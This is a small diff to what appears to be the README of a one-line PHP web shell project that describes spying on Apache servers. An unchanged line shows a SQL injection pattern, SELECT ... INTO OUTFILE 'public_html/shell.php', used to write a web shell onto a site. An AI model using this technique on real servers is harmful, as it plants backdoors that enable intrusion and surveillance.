@@ -1,5 +1,5 @@
-# SHEL | one line | single File | using PHP to spy apache servers
-SHELL compatible with injection SQL
+# SHEL | one line | single File
+SHELL compatible with injection SQL using PHP to spy apache servers
 
 LIKE : `SELECT "'.$phpString.'" INTO OUTFILE "public_html/shell.php"`
 
